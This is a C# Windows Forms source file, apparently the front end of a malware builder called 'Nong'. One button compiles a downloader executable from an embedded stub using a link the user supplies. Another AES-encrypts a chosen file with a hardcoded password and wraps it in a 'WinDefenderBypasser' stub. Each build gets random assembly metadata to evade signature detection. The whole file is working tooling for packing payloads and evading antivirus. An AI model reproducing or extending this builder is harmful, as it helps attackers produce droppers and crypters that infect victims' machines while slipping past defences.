﻿using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Nong
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void metroButton1_Click(object sender, EventArgs e)
        {

            string Code = ReadStubCode("Downloader.txt", "Nong", "Stubs");
            string Ico = "";

            // Check if there are any empty fields
            if (metroTextBox1.Text.Length == 0 || metroTextBox2.Text.Length == 0)
            {
                // Display text
                MessageBox.Show("ERROR: Make sure to fill out all the fields");
            } else
            {
                Code = Code.Replace("%LINK%", metroTextBox1.Text);
                Code = Code.Replace("%EXTENTION%", "." + metroTextBox2.Text);

                if (metroTextBox3.Text.Length == 0)
                {
                    Ico = null;
                } else
                {
                    Ico = metroTextBox3.Text;
                }

                if (metroToggle1.Checked == true)
                {
                    Code = Code.Replace("%DELAY%", "TRUE");
                }

                GenerateRandomAssembly();

                // Compile executable, if there were any errors, put then into the variable
                CodeDom.CompileExecutable(new[] { Code }, Sfd("exe output|*.exe"), Ico, AssemblyInfo, null, false, new[] { "system.dll" });
            }
        }


        private void metroButton10_Click(object sender, EventArgs e)
        {
            string Code = ReadStubCode("WinDefenderBypasser.txt", "Nong", "Stubs");
            string Ico = "";

            if (metroTextBox9.Text.Length == 0)
            {
                // Display text
                MessageBox.Show("ERROR: Make sure to fill out all the fields");
            }
            else
            {
                Encrypt(metroTextBox9.Text, "EncedFile.aes", Encoding.ASCII.GetBytes("123"));


                Code = Code.Replace("%ENCFILENAME%", "EncedFile.aes");
                Code = Code.Replace("%FILENAME%", Path.GetFileName(metroTextBox9.Text));

                if (metroTextBox7.Text.Length == 0)
                {
                    Ico = null;
                }
                else
                {
                    Ico = metroTextBox7.Text;
                }

                if (metroToggle6.Checked == true)
                {
                    Code = Code.Replace("%DELAY%", "TRUE");
                }

                GenerateRandomAssembly();

                // Compile executable, if there were any errors, put then into the variable
                CodeDom.CompileExecutable(new[] { Code }, Sfd("exe output|*.exe"), Ico, AssemblyInfo, new[] { "EncedFile.aes" }, true, new[] { "system.dll" });
            }
        }

        // Ofd method
        public static string Ofd(string Filter)
        {
            // Create new instance
            using (OpenFileDialog Ofd = new OpenFileDialog())
            {
                // Set file filter
                Ofd.Filter = Filter;

                // Check if everything is ok
                if (Ofd.ShowDialog() == DialogResult.OK)
                {
                    // Return data
                    return Ofd.FileName;
                } else
                {
                    // return data
                    return "";
                }
            }
        }

        // Sfd method
        public static string Sfd(string Filter)
        {
            // Create new SaveFileDialog instance
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                // Set file filter
                sfd.Filter = Filter;

                // Check if everything is ok
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    // Return data
                    return sfd.FileName;
                } else
                {
                    // Return data
                    return "";
                }
            }
        }

        // ReadStubCode method
        public static string ReadStubCode(string FileName, string NameSpace, string InternalFilePath)
        {
            // Get assembly
            var assembly = Assembly.GetExecutingAssembly();

            // Create new Stream instance
            using (Stream stream = assembly.GetManifestResourceStream(NameSpace + "." + (InternalFilePath == "" ? "" : InternalFilePath + ".") + FileName))
            {
                // Create new StreamReader instance
                using (StreamReader reader = new StreamReader(stream))
                {
                    // Return data
                    return reader.ReadToEnd();
                }
            }
        }

        // Create private random class
        private static Random random = new Random();

        // RandomString method
        public static string RandomString(int length)
        {
            // Set chars
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

            // Generate & return random string
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static string[] AssemblyInfo = new string[7];

        // GenerateRandomAssembly method
        public static void GenerateRandomAssembly()
        {
            // Loop though all assembly fields
            for (int i = 0; i < AssemblyInfo.Length - 1; i++)
            {
                // Set random assembly
                AssemblyInfo[i] = RandomString(8);
            }

            // Set static version info
            AssemblyInfo[6] = "1.0.0.0";
        }

        // Encrypt method
        public static void Encrypt(string InFile, string OutFile, byte[] Pass)
        {
            // Set salt
            byte[] Salt = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            // Set Cfile var
            string CFile = OutFile;

            // Create new filestream instance
            using (FileStream fsC = new FileStream(CFile, FileMode.Create))
            {
                // Create new RijndaelManaged instance
                using (RijndaelManaged AesEnc = new RijndaelManaged())
                {
                    // Set key & block size
                    AesEnc.KeySize = 256;
                    AesEnc.BlockSize = 128;

                    // Create new Rfc2898DeriveBytes instance
                    using (var Cryptokey = new Rfc2898DeriveBytes(Pass, Salt, 1000))
                    {
                        // Set general parameters
                        AesEnc.Key = Cryptokey.GetBytes(AesEnc.KeySize / 8);
                        AesEnc.IV = Cryptokey.GetBytes(AesEnc.BlockSize / 8);
                        AesEnc.Padding = PaddingMode.Zeros;

                        AesEnc.Mode = CipherMode.CBC;

                        // Create new CryptoStream instance
                        using (CryptoStream CryptoS = new CryptoStream(fsC, AesEnc.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            // Create new FileStream instance
                            using (FileStream FileStreamIn = new FileStream(InFile, FileMode.Open))
                            {
                                // Encrypt file
                                int d;
                                while ((d = FileStreamIn.ReadByte()) != -1)
                                    CryptoS.WriteByte((byte)d);

                                // Close all streams
                                FileStreamIn.Close();
                                CryptoS.Close();
                                fsC.Close();
                            }
                        }
                    }
                }
            }
        }

        // Controls
        #region Controls
        private void metroTextBox6_Click(object sender, EventArgs e)
        {

        }

        private void metroTextBox5_Click(object sender, EventArgs e)
        {

        }

        private void metroTextBox4_Click(object sender, EventArgs e)
        {

        }

        private void metroToggle4_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroToggle3_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroButton7_Click(object sender, EventArgs e)
        {
            // Select file
            metroTextBox9.Text = Ofd("");
        }

        private void metroTextBox9_Click(object sender, EventArgs e)
        {

        }

        private void metroTextBox7_Click(object sender, EventArgs e)
        {

        }

        private void metroButton9_Click(object sender, EventArgs e)
        {
            // Set icon
            metroTextBox7.Text = Ofd("ico file|*.ico");
        }

        private void metroToggle6_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroToggle5_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            // Set icon
            metroTextBox3.Text = Ofd("ico file|*.ico");
        }

        private void metroTextBox3_Click(object sender, EventArgs e)
        {

        }

        private void metroTextBox1_Click(object sender, EventArgs e)
        {

        }

        private void metroTextBox2_Click(object sender, EventArgs e)
        {

        }

        private void metroToggle1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroToggle2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroTabPage1_Click(object sender, EventArgs e)
        {

        }
        #endregion
    }
}
